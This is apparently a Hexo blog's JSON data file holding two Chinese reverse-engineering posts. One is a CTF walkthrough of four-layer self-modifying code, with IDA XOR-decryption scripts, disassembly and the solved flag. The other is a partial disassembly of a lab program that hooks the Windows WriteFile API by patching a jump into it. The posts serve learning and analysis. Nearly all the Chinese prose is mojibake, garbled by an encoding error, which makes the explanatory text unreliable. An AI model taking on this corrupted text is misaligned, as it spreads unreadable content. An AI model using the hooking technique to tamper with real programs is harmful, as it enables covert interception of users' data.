{"meta":{"title":"K4oer'Blog","subtitle":"é£ä¹Ÿæ¸©æŸ”","description":"Time is water","author":"K4oer","url":"http://K4oer.gitee.io","root":"/"},"pages":[{"title":"404","date":"2021-05-08T09:40:27.000Z","updated":"2021-05-08T09:45:11.283Z","comments":false,"path":"404/index-1.html","permalink":"http://k4oer.gitee.io/404/index-1.html","excerpt":"","text":""},{"title":"404","date":"2021-05-06T14:02:40.000Z","updated":"2021-05-06T14:02:40.560Z","comments":true,"path":"404/index.html","permalink":"http://k4oer.gitee.io/404/index.html","excerpt":"","text":""},{"title":"about","date":"2021-05-08T09:12:45.000Z","updated":"2021-05-08T09:13:19.094Z","comments":true,"path":"about/index.html","permalink":"http://k4oer.gitee.io/about/index.html","excerpt":"","text":""},{"title":"contact","date":"2021-05-08T09:13:48.000Z","updated":"2021-05-08T09:15:05.754Z","comments":true,"path":"contact/index.html","permalink":"http://k4oer.gitee.io/contact/index.html","excerpt":"","text":""},{"title":"","date":"2021-05-06T13:12:31.302Z","updated":"2021-05-06T13:12:12.058Z","comments":true,"path":"links/index.html","permalink":"http://k4oer.gitee.io/links/index.html","excerpt":"","text":"K4oer'CSDN"},{"title":"","date":"2021-05-06T13:10:18.964Z","updated":"2021-05-06T13:10:07.175Z","comments":true,"path":"links/link.css","permalink":"http://k4oer.gitee.io/links/link.css","excerpt":"","text":".allLinks { display: -webkit-flex; /* Safari */ display: flex; flex-wrap: wrap; justify-content: center; } .allLinks li { list-style: none; display: inline-flex; border-radius: 1rem; width: 20rem; height: 8rem; margin-top: 3rem; margin-right:2rem; overflow: hidden; /*è¶…å‡ºè¾¹ç•Œéƒ¨åˆ†éšè—*/ background-color: #403e3e; } .allLinks li img { width:6rem; height:6rem; border-radius: 50%; margin: 1rem; } .allLinks li a { width: 12rem; padding-top: 10%; text-align: center; cursor: pointer; text-decoration: none; font-size: 1.7rem; font-family: \"Helvetica Neue\", Helvetica, \"PingFang SC\", \"Hiragino Sans GB\", \"Microsoft YaHei\", å¾®è½¯é›…é»‘, Arial, sans-serif; color:#bbb; word-wrap: break-word; /*æ–‡å­—æ¢è¡Œ*/ }"},{"title":"","date":"2021-05-06T13:14:35.158Z","updated":"2021-05-06T13:14:35.158Z","comments":true,"path":"tags/index.html","permalink":"http://k4oer.gitee.io/tags/index.html","excerpt":"","text":""},{"title":"friends","date":"2021-05-06T14:02:26.000Z","updated":"2021-05-08T15:09:15.864Z","comments":true,"path":"friends/index-1.html","permalink":"http://k4oer.gitee.io/friends/index-1.html","excerpt":"","text":""},{"title":"categories","date":"2021-05-04T16:15:41.000Z","updated":"2021-05-04T16:15:41.988Z","comments":true,"path":"categories/index.html","permalink":"http://k4oer.gitee.io/categories/index.html","excerpt":"","text":""},{"title":"åˆ†ç±»ä¸€","date":"2021-05-06T10:16:22.000Z","updated":"2021-05-08T09:11:41.163Z","comments":false,"path":"categories/index-1.html","permalink":"http://k4oer.gitee.io/categories/index-1.html","excerpt":"","text":""}],"posts":[{"title":"SMCä»£ç è‡ªä¿®æ”¹é€†å‘åˆ†æ","slug":"SMCä»£ç è‡ªä¿®æ”¹é€†å‘åˆ†æï¼ˆä»…ç”¨æ±‡ç¼–è¯­è¨€åˆ†æ)","date":"2021-06-03T14:06:33.163Z","updated":"2021-06-03T14:06:40.420Z","comments":true,"path":"undefined/SMCä»£ç è‡ªä¿®æ”¹é€†å‘åˆ†æï¼ˆä»…ç”¨æ±‡ç¼–è¯­è¨€åˆ†æ).html","link":"","permalink":"http://k4oer.gitee.io/undefined/SMC%E4%BB%A3%E7%A0%81%E8%87%AA%E4%BF%AE%E6%94%B9%E9%80%86%E5%90%91%E5%88%86%E6%9E%90%EF%BC%88%E4%BB%85%E7%94%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%88%86%E6%9E%90).html","excerpt":"","text":"@[TOC] å†™åœ¨å‰é¢ åŠ å¯†ä»£ç åœ¨æ–‡æœ«é™„ä»¶ ç”¨åˆ°çš„idcè§£å¯†è„šæœ¬: 123456789101112131415161718192021222324252627282930313233343536373839404142#include &lt;idc.idc&gt;static xor_setp1()&#123; auto addr = 0x00414c3c; //è¿™é‡Œå¡«å…¥è¦è§£å¯†å­—èŠ‚ä¸²çš„èµ·å§‹åœ°å€ auto i = 0; for(i=0;addr+i&lt;0x00414C7F;i++) //å¾ªç¯ç»“æŸçš„æ¡ä»¶ä¸ºå­—èŠ‚ä¸²çš„ç»“æŸåœ°å€ &#123; PatchByte(addr+i,Byte(addr+i)^0x7D); //å¼‚æˆ–çš„æ•°å­—æ ¹æ®æƒ…å†µä¿®æ”¹ &#125;&#125;static xor_setp2()&#123; auto addr = 0x00414be0; //è¿™é‡Œå¡«å…¥è¦è§£å¯†å­—èŠ‚ä¸²çš„èµ·å§‹åœ°å€ auto i = 0; for(i=0;addr+i&lt;0x00414C3A;i++) //å¾ªç¯ç»“æŸçš„æ¡ä»¶ä¸ºå­—èŠ‚ä¸²çš„ç»“æŸåœ°å€ &#123; PatchByte(addr+i,Byte(addr+i)^0x43); //å¼‚æˆ–çš„æ•°å­—æ ¹æ®æƒ…å†µä¿®æ”¹ &#125;&#125;static xor_setp3()&#123; auto addr = 0x00414a84; //è¿™é‡Œå¡«å…¥è¦è§£å¯†å­—èŠ‚ä¸²çš„èµ·å§‹åœ°å€ auto i = 0; for(i=0;addr+i&lt;0x00414a84 + 347;i++) //å¾ªç¯ç»“æŸçš„æ¡ä»¶ä¸ºå­—èŠ‚ä¸²çš„ç»“æŸåœ°å€ &#123; PatchByte(addr+i,Byte(addr+i)^0x55); //å¼‚æˆ–çš„æ•°å­—æ ¹æ®æƒ…å†µä¿®æ”¹ &#125;&#125;static xor_setp4()&#123; auto addr = 0x00414a30; //è¿™é‡Œå¡«å…¥è¦è§£å¯†å­—èŠ‚ä¸²çš„èµ·å§‹åœ°å€ auto i = 0; for(i=0;addr+i&lt;0x00414a30 + 83;i++) //å¾ªç¯ç»“æŸçš„æ¡ä»¶ä¸ºå­—èŠ‚ä¸²çš„ç»“æŸåœ°å€ &#123; PatchByte(addr+i,Byte(addr+i)^0x4D); //å¼‚æˆ–çš„æ•°å­—æ ¹æ®æƒ…å†µä¿®æ”¹ &#125;&#125;static main()&#123; xor_setp1();&#125; å®éªŒåˆ†æç¬¬ä¸€å±‚ ç”¨IDAæ‰“å¼€7-3çš„å®éªŒç»ƒä¹ .exeï¼Œè¿›å…¥ä¸»å‡½æ•°å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ä¸»å‡½æ•°ç¬¬ä¸€éƒ¨åˆ†ï¼Œä¸»è¦çš„åŠŸèƒ½æ˜¯æŒ‰è¦æ±‚è¾“å…¥ä¸€ä¸²å­—ç¬¦ï¼Œå¹¶åˆ¤æ–­å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦ç­‰äº28ï¼Œå¦‚æœä¸ç­‰äºåˆ™è¾“å‡ºâ€Try againâ€¦â€¦â€ï¼Œç­‰äº28åˆ™å…¥ä¸‹ä¸€æ¨¡å— 123456789101112lea eax, [ebp+Str] push eaxpush offset a100s ; &quot;%100s&quot;call _scanfadd esp, 8lea ecx, [ebp+Str]push ecx ; Strcall _strlenadd esp, 4mov [ebp+var_4], eaxcmp [ebp+var_4], 1Ch (28)jz short loc_40107F æ¥ä¸‹æ¥æ˜¯åˆ¤æ–­å­—ç¬¦ä¸²çš„æœ€åä¸€ä½ï¼ˆé™¤\\nï¼‰æ˜¯å¦ä¸º7Dhï¼ˆâ€}â€)ï¼Œå¦‚æœä¸æ˜¯åˆ™å°†eaxç½®é›¶å¹¶è¿”å›ï¼Œä¹‹åè·³è½¬åˆ°æœ€ç»ˆçš„æ ˆé”€æ¯æ“ä½œã€‚æ˜¯åˆ™è¿›å…¥ä¸‹ä¸€æ¨¡å— ä¹‹åæ˜¯forå¾ªç¯ï¼Œæ¡ä»¶ä¸ºå¯¹byte_414C3Cæ•°ç»„çš„å‰67ä¸ªå…ƒç´ å¾ªç¯ï¼Œåœ¨å¾ªç¯å†…éƒ¨ï¼š 123456mov edx, [ebp+var_70]movsx eax, byte_414C3C[edx]xor eax, 7Dh //å°†byte_414C3Cæ•°ç»„å‰67ä½å…ƒç´ æ¯ä¸€ä½éƒ½å¼‚æˆ–7Dh(åŠ å¯†)mov ecx, [ebp+var_70]mov byte_414C3C[ecx], al //å¼‚æˆ–ç»“æœè¦†ç›–åŸæ¥çš„å€¼jmp short loc_401095 å¾ªç¯ç»“æŸåï¼š 1234567891011121314loc_4010BC:mov dword ptr [ebp-6Ch], offset byte_414C3C //å°†byte_414C3Cæ•°ç»„èµ‹ç»™dword ptr [ebp-6Ch]mov esi, esppush offset unk_414BE0 //å°†unk414BE0ä¹Ÿå°±æ˜¯ä¸‹ä¸€å±‚åŠ å¯†ä»£ç çš„åœ°å€å‹å…¥æ ˆlea edx, [ebp+Str]push edxcall dword ptr [ebp-6Ch]add esp, 8cmp esi, espcall __chkespjmp short loc_4010E1 loc_4010E1:xor eax, eax //è¿”å›ç»“æœeax=0 äº†è§£ç¬¬ä¸€å±‚ç»“æ„åå¯¹ç¬¬ä¸€å±‚ä»£ç è¿›è¡Œè§£å¯†ï¼ŒåŒå‡»byte_414C3CæŸ¥çœ‹å†…å®¹ï¼Œæ¨æµ‹ä¸ºSMCåŠ å¯†ä»£ç ï¼Œé•¿åº¦ä¸º67ï¼Œèµ·å§‹åœ°å€ä¸º00414C3C,ç»“æŸåœ°å€ä¸º00414C7F åˆ©ç”¨IDAæ‰§è¡Œidcè§£å¯†è„šæœ¬ 1234567891011121314#include &lt;idc.idc&gt;static xor_setp1()&#123; auto addr = 0x00414c3c; //è¿™é‡Œå¡«å…¥è¦è§£å¯†å­—èŠ‚ä¸²çš„èµ·å§‹åœ°å€ auto i = 0; for(i=0;addr+i&lt;0x00414C7F;i++) //å¾ªç¯ç»“æŸçš„æ¡ä»¶ä¸ºå­—èŠ‚ä¸²çš„ç»“æŸåœ°å€ &#123; PatchByte(addr+i,Byte(addr+i)^0x7D); //å¼‚æˆ–çš„æ•°å­—æ ¹æ®æƒ…å†µä¿®æ”¹ &#125;&#125;static main()&#123; xor_setp1();&#125; ç‚¹å‡»File-&gt;Script fileï¼Œæ‰“å¼€è§£å¯†è„šæœ¬è§£å¯†åbyte_414C3Cå˜ä¸ºï¼šæŒ‰å¿«æ·é”®Cå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæ±‡ç¼–è¯­è¨€ï¼šå³é”®loc_414C3C,ç‚¹å‡»create functionå°†æ±‡ç¼–è¯­è¨€è½¬æ¢ä¸ºå‡½æ•°ï¼Œä½¿å…¶å¯ä»¥è¿›è¡ŒF5åæ±‡ç¼–ï¼šç»“æœå¦‚ä¸‹ï¼šå‘ç°å…¶é€»è¾‘ä¸ºåˆ¤æ–­å‰äº”ä¸ªå­—ç¬¦æ˜¯å¦ä¸ºâ€flag{â€œï¼Œä¸æ˜¯åˆ™è·³è½¬åˆ°loc_414C7B,è¿”å›eax=0ï¼Œæ˜¯åˆ™è¿›å…¥loc_414C64ï¼Œåˆ†æå¦‚ä¸‹ï¼š 12345678910xor byte ptr [ecx+edx], 43h //å°†byteæ•°ç»„å‰90ä½é€ä½å¼‚æˆ–43hinc ecx //å¾ªç¯å˜é‡è‡ªå¢cmp ecx, 90 //å¾ªç¯æ¡ä»¶:byteæ•°ç»„å‰90ä½jl short loc_414C64 // å³jump lessæŒ‡ä»¤ï¼Œecxå°äº90åˆ™è·³è½¬ï¼Œdo-whileå¾ªç¯add eax, 5 push offset unk_414A84 //å°†åç§»é‡unk_414A84å‹å…¥æ ˆ,è¯¥åœ°å€å¯¹åº”çš„æ˜¯ç¬¬ä¸‰å±‚SMCå‡½æ•°åœ°å€push eaxcall edxpop ecxpop ecx å›åˆ°ç¬¬ä¸€å±‚mainå‡½æ•°å†…ç»™å‡ºçš„ç¬¬äºŒå±‚è‡ªåŠ å¯†ç¬¬äºŒå±‚ä»£ç ï¼š 1234567891011loc_4010BC:mov dword ptr [ebp-6Ch], offset sub_414C3Cmov esi, esppush offset unk_414BE0 //è¿™é‡Œunk_414BE0åµŒå¥—åœ¨sub_414C3C,åˆ†æçŸ¥ä¸ºç¬¬äºŒå±‚çš„åœ°å€lea edx, [ebp+Str]push edxcall dword ptr [ebp-6Ch]add esp, 8cmp esi, espcall __chkespjmp short loc_4010E1 ä¸‹é¢å¯¹unk_414BE0åˆ†æ ç¬¬äºŒå±‚ åŒå‡»unk_414BE0ï¼Œå¦‚ä¸‹ï¼šæ ¹æ®ä»£ç æ ¼å¼æ¨æµ‹ä¸ºSMCï¼Œå­—ç¬¦ä¸²èµ·å§‹ä½ç½®çš„åœ°å€ä¸º00414BE0,ç»“æŸåœ°å€ä¸º00414C3Bã€‚å¯¹unk_414BE0è¿›è¡Œè§£å¯†,ä½¿ç”¨idcè„šæœ¬ 12345678910111213#include &lt;idc.idc&gt;static xor_setp2()&#123; auto addr = 0x00414be0; //è¿™é‡Œå¡«å…¥è¦è§£å¯†å­—èŠ‚ä¸²çš„èµ·å§‹åœ°å€ auto i = 0; for(i=0;addr+i&lt;0x00414C3A;i++) //å¾ªç¯ç»“æŸçš„æ¡ä»¶ä¸ºå­—èŠ‚ä¸²çš„ç»“æŸåœ°å€ &#123; PatchByte(addr+i,Byte(addr+i)^0x43); //å¼‚æˆ–çš„æ•°å­—æ ¹æ®æƒ…å†µä¿®æ”¹ &#125;&#125;static main()&#123; xor_setp2();&#125; è§£å¯†åï¼šæŒ‰å¿«æ·é”®Cè½¬æ¢ä¸ºæ±‡ç¼–è¯­è¨€ï¼šå³é”®create functionå¾—æ±‡ç¼–å‡½æ•°ï¼Œè¿›è¡Œåˆ†æï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657.data:00414BE0 sub_414BE0 proc near ; DATA XREF: _main_0+B5â†‘o.data:00414BE0.data:00414BE0 var_8 = dword ptr -8.data:00414BE0 var_4 = byte ptr -4.data:00414BE0 arg_0 = dword ptr 8.data:00414BE0 arg_4 = dword ptr 0Ch.data:00414BE0.data:00414BE0 push ebp.data:00414BE1 mov ebp, esp.data:00414BE3 push ecx.data:00414BE4 push ecx.data:00414BE5 push ebx.data:00414BE6 mov ebx, [ebp+arg_0].data:00414BE9 lea eax, [ebp+var_8].data:00414BEC push esi.data:00414BED push edi.data:00414BEE xor edx, edx //edxå˜é‡ç½®0.data:00414BF0 mov [ebp+var_8], 93A9A498h //[ebp+var_8]è®¾ .data:00414BF7 mov edi, ebx //ä¸º-1817598824.data:00414BF9 mov [ebp+var_4], dl.data:00414BFC mov esi, edx.data:00414BFE sub edi, eax //ediå‡å»eaxç»“æœå­˜å…¥edi .data:00414C00.data:00414C00 loc_414C00: ; CODE XREF: sub_414BE0+32â†“j.data:00414C00 lea ecx, [ebp+var_8].data:00414C03 add ecx, esi //å°†ecxï¼Œesiç›¸åŠ .data:00414C05 mov al, [edi+ecx] //å°†ediå’Œecxå¯¹åº”çš„æ•°èµ‹ç»™alå¯„å­˜å™¨.data:00414C08 xor al, 0CCh //al å¼‚æˆ–0CCh.data:00414C0A cmp al, [ecx] //åˆ¤æ–­alçš„å€¼æ˜¯å¦å’Œ.data:00414C0C jnz short loc_414C31 //è¿™é‡Œä¸ºwhileå¾ªç¯çš„æ ‡å¿—,å¦‚æœä¸ç›¸ç­‰è·³åˆ°loc_414C31è¿›è¡Œæ ˆé”€æ¯ï¼Œå¦åˆ™è¿›å…¥å¾ªç¯å†…éƒ¨.data:00414C0E inc esi //esiè‡ªå¢.data:00414C0F cmp esi, 4 //åˆ¤æ–­esiæ˜¯å¦å’Œ4ç›¸ç­‰.data:00414C12 jl short loc_414C00 //å¦‚æœesiå°äº4åˆ™è¿›è¡Œä¸‹ä¸€å±‚ï¼Œå¦åˆ™è¿›å…¥ifè¯­å¥å†…éƒ¨.data:00414C14 mov ecx, [ebp+arg_4].data:00414C17.data:00414C17 loc_414C17: ; CODE XREF: sub_414BE0+42â†“j.data:00414C17 xor byte ptr [edx+ecx], 55h //å°†edxå’Œecxç›¸åŠ çš„ç»“æœä¸55hå¼‚æˆ–.data:00414C1B inc edx //edxè‡ªå¢.data:00414C1C cmp edx, 15Bh //å¾ªç¯å˜é‡edxå’Œ15BHæ¯”è¾ƒ.data:00414C22 jl short loc_414C17 //do-whileå¾ªç¯å…¥å£ï¼Œå¦‚æœedxå°äº15BHåˆ™è¿›å…¥å¾ªç¯ï¼Œè·³è½¬åˆ°loc_414C17,å¦åˆ™è·³å‡ºå¾ªç¯.data:00414C24 lea eax, [ebx+4] //ebxå‚æ•°å’Œ4ç›¸åŠ å­˜å…¥eax.data:00414C27 push offset unk_414A30 //å°†åœ°å€unk_414A30å‹å…¥æ ˆä¼ å…¥ä¸‹é¢çš„ecx.data:00414C2C push eax .data:00414C2D call ecx //è°ƒç”¨ecxå‡½æ•°.data:00414C2F pop ecx.data:00414C30 pop ecx.data:00414C31.data:00414C31 loc_414C31: ; CODE XREF: sub_414BE0+2Câ†‘j.data:00414C31 pop edi.data:00414C32 pop esi.data:00414C33 xor eax, eax.data:00414C35 pop ebx.data:00414C36 mov esp, ebp.data:00414C38 pop ebp.data:00414C39 retn.data:00414C39 sub_414BE0 endp.data:00414C39 æ ¹æ®åˆ†æå¯çŸ¥whileä»£ç æ‰§è¡Œçš„æ¡ä»¶ä¸ºï¼š *(a1+v3)^0xCC == (&amp;v5+v3)ï¼Œ ä¹Ÿå°±æ˜¯è¾“å…¥çš„å­—ç¬¦å¼‚æˆ–0xCCå¯¹åº”ä¸v5ä¸­çš„æ•°0x93A9A498ç›¸ç­‰ï¼Œæ±‚å¾—å­—ç¬¦ä¸º_ehT, ç”±äºä¸è¾“å…¥çš„å­—ç¬¦é¡ºåºç›¸åï¼Œæ•…è¾“å…¥çš„ç¬¬6-9ä¸ªå­—ç¬¦ä¸ºThe_ã€‚ å›åˆ°ç¬¬äºŒå±‚sub_414C3Cå‡½æ•°,å¯¹äºä¼ å…¥çš„åœ°å€unk_414A84è¿›è¡Œåˆ†æ ç¬¬ä¸‰å±‚ åŒå‡»unk_414A84 åˆ†æä»£ç é€»è¾‘ä¸ºSMCè‡ªåŠ å¯†ï¼ŒåŒç†ä½¿ç”¨idcè„šæœ¬ï¼š123456789101112131415#include &lt;idc.idc&gt;static xor_setp3()&#123; auto addr = 0x00414a84; //è¿™é‡Œå¡«å…¥è¦è§£å¯†å­—èŠ‚ä¸²çš„èµ·å§‹åœ°å€ auto i = 0; for(i=0;addr+i&lt;0x00414a84 + 347;i++) //å¾ªç¯ç»“æŸçš„æ¡ä»¶ä¸ºå­—èŠ‚ä¸²çš„ç»“æŸåœ°å€ &#123; PatchByte(addr+i,Byte(addr+i)^0x55); //å¼‚æˆ–çš„æ•°å­—æ ¹æ®æƒ…å†µä¿®æ”¹ &#125;&#125;static main()&#123; xor_setp3();&#125; è§£å¯†ç»“æœä¸ºï¼šæŒ‰å¿«æ·é”®Cè½¬æ¢ä¸ºæ±‡ç¼–è¯­è¨€ï¼šå³é”®ç‚¹å‡»create functionè½¬æ¢ä¸ºå‡½æ•°ï¼šå‘ç°å‡ºç°å¾ˆå¤šè¯¸å¦‚â€A-Zâ€ï¼Œâ€a-zâ€ï¼Œâ€0-9â€ä»¥åŠç»“å°¾å‡ºç°çš„â€=â€æ¨æµ‹è¿›è¡Œçš„æ˜¯base64åŠ å¯†ï¼Œåˆ†ææ±‡ç¼–è¯­è¨€ç»“æ„ï¼šå‰å‡ ä¸ªlocå‡½æ•°éƒ½æœ‰cmpå’Œjleç­‰å¾ªç¯æ ‡å¿—,ç»§ç»­åˆ†æï¼Œæ³¨æ„åˆ°1234567.data:00414AD2 mov dword ptr [ebp+var_10], &#x27;hVmc&#x27;.data:00414AD9 mov dword ptr [ebp+var_10+4], &#x27;0NEb&#x27;.data:00414AE0 mov dword ptr [ebp+var_10+8], &#x27;=8lR&#x27;.data:00414AE7 stosd.data:00414AE8 mov [ebp+var_10+0Ch], cl.data:00414AEB stosd.data:00414AEC mov edi, ecx è¿™é‡Œä¼ å…¥äº†å›ºå®šå­—ç¬¦ä¸²â€cmVhbEN0Rl8=â€æ¨æµ‹ä¸ºflagçš„ç¬¬10åˆ°17ä½ï¼Œæ¥ä¸‹æ¥çš„å‡ ä¸ªlocå‡½æ•°ä¸ºbase64çš„å³ç§»è¿ç®—éƒ¨åˆ†ã€‚åœ¨å‡½æ•°çš„æœ«å°¾ï¼Œæ³¨æ„åˆ°dlå’Œå›ºå®šå­—ç¬¦ä¸²åœ¨whileå¾ªç¯å†…è¿›è¡Œäº†ç›¸ç­‰åˆ¤æ–­ï¼ŒåŒæ—¶å¯ä»¥ç”¨ODè¿›è¡ŒåŠ¨æ€è¿è¡Œè¯¥ç¨‹åºåˆ°ç¬¬ä¸‰ä¸ªå‡½æ•°éšä¾¿è¾“å…¥çš„å­—ç¬¦ä¸²åŠ å¯†åçš„ç»“æœä»ä¸ºå›ºå®šå­—ç¬¦ä¸²ï¼Œå› æ­¤å¯¹å­—ç¬¦ä¸²base64è§£å¯†å¾—ï¼šrealCtF_ï¼Œå¦‚æœæ¯”è¾ƒæ­£ç¡®ååˆ™å¯¹sub_414A30å‡½æ•°è§£å¯†å¹¶ç¼–è¯‘,å³è¯¥ç¨‹åºçš„ç¬¬ä¸‰å±‚åµŒå¥—ï¼šå›åˆ°ç¬¬äºŒå±‚ç»™å‡ºçš„åœ°å€ unk_414A30ï¼Œè¿›å…¥ä¸‹ä¸€å±‚åˆ†æ ç¬¬å››å±‚ åŒå‡»unk_414A30æŸ¥çœ‹ åŒç†åˆ†æå…¶ä¸ºSMCè‡ªåŠ å¯†ï¼Œä½¿ç”¨idcè„šæœ¬è§£å¯†ï¼š 1234567891011121314#include &lt;idc.idc&gt;static xor_setp4()&#123; auto addr = 0x00414a30; //è¿™é‡Œå¡«å…¥è¦è§£å¯†å­—èŠ‚ä¸²çš„èµ·å§‹åœ°å€ auto i = 0; for(i=0;addr+i&lt;0x00414a30 + 83;i++) //å¾ªç¯ç»“æŸçš„æ¡ä»¶ä¸ºå­—èŠ‚ä¸²çš„ç»“æŸåœ°å€ &#123; PatchByte(addr+i,Byte(addr+i)^0x4D); //å¼‚æˆ–çš„æ•°å­—æ ¹æ®æƒ…å†µä¿®æ”¹ &#125;&#125;static main()&#123; xor_setp4();&#125; è§£å¯†ç»“æœï¼š æŒ‰å¿«æ·é”®Cè½¬æ¢ä¸ºæ±‡ç¼–ä»£ç ï¼šå³é”®create functionç”Ÿæˆæ±‡ç¼–å‡½æ•°ï¼šåˆ†æé€»è¾‘ï¼Œæ³¨æ„åˆ°å‡½æ•°å‹å…¥äº†6FF22h,68344360h,7574766Bh,è½¬æ¢ä¸ºå­—ç¬¦ä¸²ä¸ºâ€kvtu`C4h\\&quot;oâ€œ,åœ¨loc_414A55å‡½æ•°ä¸­ï¼Œedxè‡ªå¢åï¼Œå°†byte ptr [ebp+edx+var_C]å’Œblï¼ˆä¹‹å‰å­˜å…¥å¾—ä¸‰ä¸²å­—ç¬¦ä¸²ï¼‰åˆ¤æ–­æ˜¯å¦ç›¸ç­‰ï¼Œå¹¶ä¸”å¦‚æœä¸ç›¸ç­‰åˆ™è·³è½¬åˆ°æœ¬èº«ï¼Œåˆ†æä¸ºwhileå¾ªç¯ï¼Œåœ¨å¾ªç¯å†…éƒ¨ï¼Œediå‡å»äº†esiï¼Œè€Œesiä¸ºå‚æ•°åœ°å€ï¼Œediä¸ºå­—ç¬¦ä¸²ï¼Œè€Œåœ¨loc_414A68ä¸­åˆè¿›è¡Œäº†dec ecxå³ecxè‡ªå‡ï¼Œå¯çŸ¥é€»è¾‘ä¸ºå°†å‚æ•°åœ°å€æ‰€æœ‰çš„å­—ç¬¦å‡1å’Œå­—ç¬¦ä¸²æ¯”è¾ƒï¼Œæ‰€ä»¥è¾“å…¥çš„å­—ç¬¦ä¸²åº”è¯¥ä¸ºâ€just_B3g!nâ€ã€‚ æ€»ç»“ç»¼ä¸Šæ‰€è¿°ï¼Œflagä¸º ï¼šflag{The_realCtF_just_B3g!n} é™„ä»¶é“¾æ¥ï¼šhttps://pan.baidu.com/s/1WsgS9GHjbZOjjS6YuJiYhQæå–ç ï¼šj2km","categories":[{"name":"é€†å‘","slug":"é€†å‘","permalink":"http://k4oer.gitee.io/categories/%E9%80%86%E5%90%91/"}],"tags":[]},{"title":"","slug":"WriteFileApIHook1é€†å‘åˆ†æ","date":"2021-05-24T11:42:03.848Z","updated":"2021-05-23T03:55:29.370Z","comments":true,"path":"undefined/WriteFileApIHook1é€†å‘åˆ†æ.html","link":"","permalink":"http://k4oer.gitee.io/undefined/WriteFileApIHook1%E9%80%86%E5%90%91%E5%88%86%E6%9E%90.html","excerpt":"","text":"WriteFileApIHook1é€†å‘åˆ†æ1.å®éªŒç»“æœæ‰“å¼€set_pwd.exeï¼Œä»åç§°æ¥çœ‹åº”è¯¥æ˜¯è¿›è¡Œå¯†ç è®¾ç½®ï¼Œç¨‹åºæç¤ºè¾“å…¥keyï¼šéšä¾¿è¾“å…¥11111ï¼Œç»“æœå¦‚ä¸‹ï¼štry againï¼Œå½“å°è¯•è¾“å…¥hookæ—¶ï¼Œæ˜¾ç¤ºå¦‚ä¸‹ï¼š æ‰“å¼€åœ¨æ–‡ä»¶å¤¹ä¸­ç”Ÿæˆçš„pwd.txtæ–‡ä»¶ï¼Œå‘ç°ç¬¬ä¸€æ¬¡çš„ç»“æœå¹¶ä¸æ˜¯æˆ‘ä»¬è¾“å…¥çš„11111ï¼Œè€Œæ˜¯hookï¼Œé‡å¤å‡ æ¬¡å‘ç°ç»“æœç›¸åŒã€‚ 2.å®éªŒå·¥å…·IDA (é™æ€å’ŒåŠ¨æ€åˆ†æ) 3.å®éªŒåˆ†æä½¿ç”¨IDAæ‰“å¼€exeæ–‡ä»¶ é™æ€åˆ†ææ‰“å¼€IDA View-B çª—å£ï¼Œç»“åˆæ‰€å­¦å®šä½åˆ°mainå‡½æ•°åŠä¸€äº›å…³é”®å‡½æ•°å¦‚virtualprotect åŒæ—¶æ³¨æ„åˆ°æœ‰subç­‰æ±‡ç¼–æŒ‡ä»¤ï¼Œå¯çŸ¥è¿™é‡Œä¾¿æ˜¯ä¸»å‡½æ•°ä¿®æ”¹writefileå‰5ä¸ªå­—èŠ‚çš„åœ°æ–¹ï¼Œé™æ€åˆ†æä¸»å‡½æ•°åŠŸèƒ½: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283.text:004011EE mov [ebp+Stream], 0.text:004011F5 mov [ebp+var_14], 0.text:004011FC mov [ebp+var_20], 0E9h //å°†0E9hå‹å…¥æ•°ç»„ä¸ºä¹‹åæ”¹å˜æŒ‡ä»¤åšå‡†å¤‡.text:00401200 mov [ebp+var_1F], 0.text:00401204 xor eax, eax.text:00401206 mov [ebp+var_1E], eax.text:00401209 mov ecx, ds:dword_4280C8.text:0040120F mov [ebp+Buffer], ecx.text:00401212 mov edx, ds:dword_4280CC.text:00401218 mov [ebp+var_58], edx.text:0040121B mov al, ds:byte_4280D0.text:00401220 mov [ebp+var_54], al.text:00401223 mov esi, esp.text:00401225 push offset ModuleName ; &quot;kernel32.dll&quot;.text:0040122A call ds:GetModuleHandleA.text:00401230 cmp esi, esp.text:00401232 call __chkesp.text:00401237 mov [ebp+hModule], eax.text:0040123A mov esi, esp.text:0040123C push offset ProcName ; &quot;WriteFile&quot;.text:00401241 mov ecx, [ebp+hModule].text:00401244 push ecx ; hModule.text:00401245 call ds:GetProcAddress.text:0040124B cmp esi, esp.text:0040124D call __chkesp .text:00401252 mov [ebp+var_C], eax.text:00401255 mov edx, [ebp+var_C].text:00401258 mov [ebp+lpAddress], edx.text:0040125B mov esi, esp.text:0040125D lea eax, [ebp+flOldProtect].text:00401260 push eax ; lpflOldProtect.text:00401261 push 40h ; &#x27;@&#x27; ; flNewProtect.text:00401263 push 5 ; dwSize.text:00401265 mov ecx, [ebp+lpAddress].text:00401268 push ecx ; lpAddress.text:00401269 call ds:VirtualProtect //è°ƒç”¨virtualProtectå‡½æ•°ï¼ŒåŒæ—¶ä¸ºIfè¯­å¥åˆ¤æ–­.text:0040126F cmp esi, esp .text:00401271 call __chkesp.text:00401276 test eax, eax.text:00401278 jz short loc_4012E9.text:0040127A push 5 ; Size.text:0040127C mov edx, [ebp+lpAddress].text:0040127F push edx ; Src.text:00401280 push offset unk_42DC64 ; void *.text:00401285 call _memcpy //ç¬¬ä¸€ä¸ªmemcpyå‡½æ•°å°†writefileå‡½æ•°çš„å‰5ä¸ªå­—èŠ‚ä¿å­˜.text:0040128A add esp, 0Ch.text:0040128D mov eax, offset sub_40100A.text:00401292 cdq.text:00401293 mov ecx, eax.text:00401295 mov esi, edx.text:00401297 mov eax, [ebp+var_C].text:0040129A cdq.text:0040129B sub ecx, eax.text:0040129D sbb esi, edx.text:0040129F sub ecx, 5 .text:004012A2 sbb esi, 0.text:004012A5 mov [ebp+Src], ecx //è®¡ç®—mywritefileå‡½æ•°å’Œwriteå‡½æ•°çš„åç§»å€¼ï¼ŒåŒæ—¶.text:004012A8 push 4 ; Size //å‡å»writefileå‡½æ•°çš„å‰5ä¸ªå­—èŠ‚.text:004012AA lea edx, [ebp+Src].text:004012AD push edx ; Src.text:004012AE lea eax, [ebp+var_1F].text:004012B1 push eax ; void *.text:004012B2 call _memcpy //ç¬¬äºŒä¸ªmemcpyå‡½æ•°å°†è®¡ç®—å‡ºçš„åç§»å€¼ä¸æ•°ç»„ä¸­çš„.text:004012B7 add esp, 0Ch 